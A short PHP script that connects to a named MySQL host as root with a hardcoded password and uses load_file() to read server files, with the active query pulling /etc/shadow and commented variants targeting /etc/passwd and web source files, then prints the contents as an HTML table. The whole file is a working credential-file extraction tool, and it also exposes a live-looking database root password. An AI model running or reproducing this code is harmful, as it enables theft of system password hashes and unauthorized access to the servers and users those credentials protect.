<?php
ini_set("display_errors", 1);

$link=mysql_connect("mysql.spinattic.com","root","ud3YRfmMWcFMaaSQ");

mysql_select_db("spin_bd");



//$ssqlp = 'select load_file("/var/www/index.php") as test';
//$ssqlp = 'select load_file("/home/spinattic/dev.spinattic.com/index.php") as test';
//$ssqlp = 'select load_file("/etc/passwd") as test';
$ssqlp = 'select load_file("/etc/shadow") as test';
$result = mysql_query($ssqlp);
//$row = mysql_fetch_array($result);





if (!$result) {
	$message = 'ERROR:' . mysql_error(); return $message;
} else { $i = 0; echo '<html><body><table border="1"><tr>'; while ($i < mysql_num_fields($result)) {
	$meta = mysql_fetch_field($result, $i); echo '<td>' . $meta->name . '</td>'; $i = $i + 1;
} echo '</tr>'; $i = 0; while ($row = mysql_fetch_row($result)) {
	echo '<tr>'; $count = count($row); $y = 0; while ($y < $count) {
		$c_row = current($row); echo '<td>' . $c_row . '</td>'; next($row); $y = $y + 1;
	} echo '</tr>'; $i = $i + 1;
} echo '</table></body></html>'; mysql_free_result($result);
} mysql_close ($link);



?>